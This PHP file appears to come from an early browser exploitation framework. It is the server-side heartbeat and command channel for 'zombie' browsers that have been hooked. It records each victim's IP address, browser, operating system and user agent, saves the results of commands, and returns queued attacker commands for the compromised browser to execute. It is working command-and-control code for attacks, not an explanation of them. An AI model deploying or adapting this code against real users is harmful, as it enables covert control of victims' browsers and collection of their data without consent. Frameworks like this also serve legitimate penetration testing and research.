<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../include/globals.inc.php");
	require_once("../include/browserdetection.inc.php");

	// --[ EXTRACT_OS
	function extract_os() {
		$user_parts = explode(";", $_SERVER['HTTP_USER_AGENT']);

		$os = trim($user_parts[2]);
		$os = str_replace(')', '', $os);

		return $os;		
	}

	// ---[ GET_UA_DETAILS
	function get_ua_details() {
		$ip = $_SERVER['REMOTE_ADDR'];
		$agent = $_SERVER['HTTP_USER_AGENT'];
		$browser = browser($_SERVER['HTTP_USER_AGENT']);
		$os = extract_os();
		
		// return the collected useragent details
		return $ip . "\n" . 
			$browser['name'] . "\n" . 
			$browser['version'] . "\n" .
			$os . "\n" . 
			$agent;
        }

	// ---[ REGISTER_HEARTBEAT
	function register_heartbeat($status, $result) {

		// construct file location strings
		$zombie_hook_dir = ZOMBIE_TMP_DIR . session_id();
		$zombie_hook_heartbeat_file = $zombie_hook_dir . "/" . HEARTBEAT_FILENAME;
		$zombie_hook_cmd_file = $zombie_hook_dir . "/" . CMD_FILENAME;
		$zombie_hook_res_file = $zombie_hook_dir . "/" . RES_FILENAME;

		// create a directory for this zombie if it doens't exist
		if(!file_exists($zombie_hook_dir)) {
			mkdir($zombie_hook_dir);
		}

		// heartbeat
		// write the heartbeat details to file
		file_put_contents($zombie_hook_heartbeat_file, get_ua_details());

		// if there is a result write it to file
		if($status != HEARTBEAT_NOP) {
			file_put_contents($zombie_hook_res_file, $result);
		}

		if(!file_exists($zombie_hook_cmd_file)) { return 0; }

		// get the command from $zombie_hook_cmd_file
		$lines = file($zombie_hook_cmd_file); 
		unlink($zombie_hook_cmd_file);

		return join("\n", $lines);
	}
?>